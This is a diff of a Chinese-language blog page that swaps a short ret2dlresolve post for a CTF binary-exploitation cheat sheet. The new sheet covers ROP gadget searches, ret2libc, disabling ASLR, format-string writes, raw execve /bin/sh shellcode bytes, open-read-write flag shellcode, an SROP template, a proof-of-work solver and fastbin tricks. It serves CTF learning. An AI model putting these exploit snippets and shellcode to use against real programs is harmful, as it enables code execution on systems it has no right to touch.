@@ -4,10 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="pwntools构造ret2dlresolve模板, 1amfree">
-    <meta name="description" content="pwntools构造ret2dlresolve模板Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:
+    <meta name="keywords" content="pwn, 1amfree">
+    <meta name="description" content="pwnpwn更换目标libcpatchelf --replace-needed libc.so.6 你要换的libc的硬路径 .&amp;#x2F;pwn
 
-class Ret2dlresolvePayl">
+patchelf --set-interpreter ld的硬路径 .&amp;#x2F;pwn
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -30,7 +31,7 @@ class Ret2dlresolvePayl">
     </style>
 
 
-    <title>pwntools构造ret2dlresolve模板 | 1amfree</title>
+    <title>pwn | 1amfree</title>
     <link rel="icon" type="image/jpeg" href="/logo.jpeg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -236,12 +237,12 @@ class Ret2dlresolvePayl">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">pwntools构造ret2dlresolve模板</h1>
+                    <h1 class="description center-align post-title">pwn</h1>
                 </div>
             </div>
         </div>
@@ -369,8 +370,8 @@ class Ret2dlresolvePayl">
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/pwn/" class="post-category">
-                                pwn
+                            <a href="/categories/%E5%91%BD%E4%BB%A4/" class="post-category">
+                                命令
                             </a>
                         
                     </div>
@@ -382,28 +383,28 @@ class Ret2dlresolvePayl">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-15
+                    2022-04-19
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-20
+                    2022-04-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    247
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -431,44 +432,147 @@ class Ret2dlresolvePayl">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="pwntools构造ret2dlresolve模板"><a href="#pwntools构造ret2dlresolve模板" class="headerlink" title="pwntools构造ret2dlresolve模板"></a>pwntools构造ret2dlresolve模板</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:
+                <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn更换目标libc"><a href="#pwn更换目标libc" class="headerlink" title="pwn更换目标libc"></a>pwn更换目标libc</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">patchelf --replace-needed libc.so.6 你要换的libc的硬路径 .&#x2F;pwn
 
-class Ret2dlresolvePayload(__builtin__.object)
- |  Methods defined here:
- |  
- |  __init__(self, elf, symbol, args, data_addr&#x3D;None)
- |  
- |  ----------------------------------------------------------------------
- |  Data descriptors defined here:
- |  
- |  __dict__
- |      dictionary for instance variables (if defined)
- |  
- |  __weakref__
- |      list of weak references to the object (if defined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+patchelf --set-interpreter ld的硬路径 .&#x2F;pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>elf：相应的文件</p>
-<p>symbol：函数名称</p>
-<p>args：函数参数</p>
-<p>data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)</p>
-<p>常用方法（用之前要设置context.binary和elf）</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">dlresolve &#x3D; Ret2dlresolvePayload(elf,symbol&#x3D;&quot;system&quot;,args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;],data_addr&#x3D;0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="标题指定"><a href="#标题指定" class="headerlink" title="标题指定"></a>标题指定</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">context(arch&#x3D;&quot;i386&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
 
-<p>print(rop.dump())可以查看rop链内容</p>
-<p>以上来自TTYflag师傅的介绍</p>
-<p>在使用前先指定</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">rop&#x3D;ROP(&quot;.&#x2F;pwn&quot;)
-#pwntools模板
-dlresolve &#x3D; Ret2dlresolvePayload(elf, symbol&#x3D;&quot;system&quot;, args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;])
-rop.read(0, dlresolve.data_addr)
-rop.ret2dlresolve(dlresolve)
-info(rop.dump()) #查看rop信息
-payload&#x3D;fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;)
-#0x4c是写入rop链的地方，0x100是read读入的大小。
-#fit就是填充一下
-r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../pictures/1.jpg" alt="1"></p>
+<h2 id="ROPgedget"><a href="#ROPgedget" class="headerlink" title="ROPgedget"></a>ROPgedget</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;
+查找可存储寄存器的代码
+ ROPgadget --binary rop --string &quot;&#x2F;bin&#x2F;sh&quot;
+查找字符串
+ROPgadget --binary rop  --only &#39;int&#39;
+查找有int 0x80的地址
+
+写rop也可以用ROPgadget
+ROPgadget --binary .&#x2F;rop --ropchain
+from struct import pack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">libc_write&#x3D;libc.symbols[&quot;write&quot;]
+system_addr&#x3D;base_addr+libc.symbols[&quot;system&quot;]
+bin_sh&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
+
+r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo sh -c &quot;echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot;
+即可关闭ASLR
+sudo sh -c &quot;echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space&quot; 
+开启ASLR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">任意地址写
+直接使用pwntools的fmtstr_payload函数
+如：需要在0xffffdafc该地址上写入数据0x5201314
+fmtstr_payload(7,&#123;0xffffdafc:0x5201314&#125;)
+前提是需要先确定好字符串的偏移量，这上面为7
+
+fmtstr_payload(offset, writes, numbwritten&#x3D;0, write_size&#x3D;&#39;byte&#39;)
+第一个参数表示格式化字符串的偏移；
+第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；本题是将0804a048处改为0x2223322
+第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
+第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
+fmtstr_payload函数返回的就是payload
+
+格式化字符串偏移量查找：
+fmtarg 0xffffff
+
+修改多个地址的值：
+payload&#x3D;fmtstr_payload(6,&#123;atoi_got:system_plt+6,system_got:main&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pwntools生成64位shellcode语句：
+shellcode&#x3D;asm(shellcraft.amd64.sh(),arch&#x3D;&#39;amd64&#39;)
+shellcode&#x3D;asm(shellcraft.sh())
+
+32位shellcode：
+&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
+
+64位shellcode：
+&#39;\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05&#39;
+
+&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;
+
+shellcrft生成orw的shellcode：
+code &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)
+code +&#x3D; shellcraft.read(3,target_addr,0x50)
+code +&#x3D; shellcraft.write(1, target_addr, 0x50)
+shellcode&#x3D;asm(code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="SROP模板"><a href="#SROP模板" class="headerlink" title="SROP模板"></a>SROP模板</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">sigframe &#x3D; SigreturnFrame()
+sigframe.rax &#x3D; constants.SYS_execve
+sigframe.rdi &#x3D; stack_addr + 0x120  # &quot;&#x2F;bin&#x2F;sh&quot; &#39;s addr
+sigframe.rsi &#x3D; 0x0
+sigframe.rdx &#x3D; 0x0
+sigframe.rsp &#x3D; stack_addr
+sigframe.rip &#x3D; syscall_ret
+
+read &#x3D; SigreturnFrame()
+read.rax &#x3D; constants.SYS_read
+read.rdi &#x3D; 0
+read.rsi &#x3D; stack_addr
+read.rdx &#x3D; 0x400
+read.rsp &#x3D; stack_addr
+read.rip &#x3D; syscall_ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><pre class="line-numbers language-none"><code class="language-none">int绕过判断条件，输入2147483648，返回0x80000000
+
+http:&#x2F;&#x2F;www.binaryconvert.com&#x2F;convert_double.html
+可用于查询小数的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">seccomp-tools dump .&#x2F;file
+分析程序的seccomp状态，哪些被系统被禁用了安装<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="多线程查看"><a href="#多线程查看" class="headerlink" title="多线程查看"></a>多线程查看</h2><pre class="line-numbers language-none"><code class="language-none">gdb 中使用 &#39;fsbase&#39; 指令即可获得 fs 寄存器的值，&#39;info threads&#39; 可以查看当前的线程，&#39;thread i&#39; 可以切换到第 i 个线程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Sha256爆破-proof-of-work"><a href="#Sha256爆破-proof-of-work" class="headerlink" title="Sha256爆破 proof of work"></a>Sha256爆破 proof of work</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+import re
+import itertools
+import string
+import codecs
+from hashlib import sha256
+from pwn import remote, context
+from os import urandom
+import itertools
+import datetime
+#r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)
+r&#x3D;remote(&quot;chuj.top&quot;,51513)
+def PoW(hash_value, part):
+    alphabet &#x3D; string.ascii_letters + string.digits
+    for x in itertools.product(alphabet, repeat&#x3D;4):
+        nonce &#x3D; &#39;&#39;.join(x)
+        if sha256((nonce + part).encode()).hexdigest() &#x3D;&#x3D; hash_value:
+            return nonce
+elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;note&quot;)
+libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;hgame&#x2F;oldfashion_note&#x2F;libc-2.31.so&quot;)
+context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)
+context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]
+
+r.recvuntil(&quot;&#x3D;&#x3D;&#x3D;\n&quot;)
+line &#x3D; r.recvuntil(b&#39;\n&#39;)
+print(line)
+re_res &#x3D; re.search(r&#39;\) &#x3D;&#x3D; ([0-9a-z]&#123;64&#125;)&#39;, line.decode())
+print(re_res)
+# part &#x3D; re_res.group(1)
+# print(part)
+hash_value &#x3D; re_res.group(1)
+print(hash_value)
+nonce &#x3D; PoW(hash_value, &#39;&#39;)
+print(nonce)
+r.sendline(nonce.encode())
+print(&#39;PoW finish.&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="find-fake-fast"><a href="#find-fake-fast" class="headerlink" title="find_fake_fast"></a>find_fake_fast</h2><pre class="line-numbers language-none"><code class="language-none">Fastbin attack在申请堆块时会对chunk的size域进行检查，因此在申请时，需要对size域的检查进行绕过。
+将堆块申请到malloc_hook附近，从而修改malloc_hook的内容，可以使用pwndbg自带的命令：
+find_fake_fast 0x7ffff7dd1b10 0x70
+0x7ffff7dd1b10为main_arena的地址或想要修改的内容
+0x70为想要申请的fake_chunk的size，一般为0x70
+Print (viod *)&amp;main_arena为打印main_arena的地址
+Print (void *)&amp;__malloc_hook<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="E:\笔记\笔记图片\find_fake_fast.png"></p>
 
                 
             </div>
@@ -495,7 +599,7 @@ r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></sp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://1amfree.github.io.com/posts/1010.html">http://1amfree.github.io.com/posts/1010.html</a>
+                    <a href="http://1amfree.github.io.com/posts/51111.html">http://1amfree.github.io.com/posts/51111.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -579,7 +683,7 @@ r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></sp
         repo: '1amfree.github.io',
         owner: '1amfree',
         admin: "1amfree",
-        id: '2020-02-15T14-18-46',
+        id: '2022-04-19T12-08-22',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -609,9 +713,60 @@ r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></sp
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/51111.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="pwn">
+                        
+                        <span class="card-title">pwn</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-19
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%91%BD%E4%BB%A4/" class="post-category">
+                                    命令
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/posts/16107.html">
                     <div class="card-image">
@@ -629,9 +784,9 @@ r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></sp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-18
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -643,56 +798,6 @@ r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></sp
                             
                         </span>
                     </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/posts/1010.html">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="pwntools构造ret2dlresolve模板">
-                        
-                        <span class="card-title">pwntools构造ret2dlresolve模板</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-15
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                 </div>
                 
             </div>
